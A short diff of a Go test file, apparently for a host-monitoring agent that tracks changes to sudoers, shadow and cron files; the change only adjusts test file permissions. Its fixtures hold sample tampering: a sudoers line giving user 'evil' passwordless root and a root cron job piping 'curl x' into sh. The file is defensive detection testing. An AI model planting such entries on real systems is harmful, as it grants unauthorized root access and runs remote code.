@@ -55,7 +55,7 @@ func TestDiffNeverCarriesSecrets(t *testing.T) {
 
 func TestFileChangesCarryTheirLines(t *testing.T) {
 	dir := t.TempDir()
-	sudo := write(t, dir+"/sudoers", "root ALL=(ALL) ALL\n", 0o440)
+	sudo := write(t, dir+"/sudoers", "root ALL=(ALL) ALL\n", 0o640)
 	shadow := write(t, dir+"/shadow", "root:$6$abc:1::::::\n", 0o600)
 	a := &Agent{cfg: &Config{MaxQueue: 100, StateDir: t.TempDir(), WatchFiles: []string{dir + "/*"}}, state: &State{Files: map[string]FileState{}, Users: map[string]int{}, Keys: map[string][]AuthKey{}}, flushNow: make(chan struct{}, 1)}
 	a.scanFiles() // baseline, keeps copies
@@ -64,7 +64,7 @@ func TestFileChangesCarryTheirLines(t *testing.T) {
 	if _, ok := a.contents().get(shadow); ok {
 		t.Fatal("shadow content must never be stored")
 	}
-	os.WriteFile(sudo, []byte("root ALL=(ALL) ALL\nevil ALL=(ALL) NOPASSWD: ALL\n"), 0o440)
+	os.WriteFile(sudo, []byte("root ALL=(ALL) ALL\nevil ALL=(ALL) NOPASSWD: ALL\n"), 0o640)
 	os.WriteFile(shadow, []byte("root:$6$def:1::::::\n"), 0o600)
 	write(t, dir+"/cron.new", "* * * * * root curl x|sh\n", 0o644)
 	a.scanFiles()
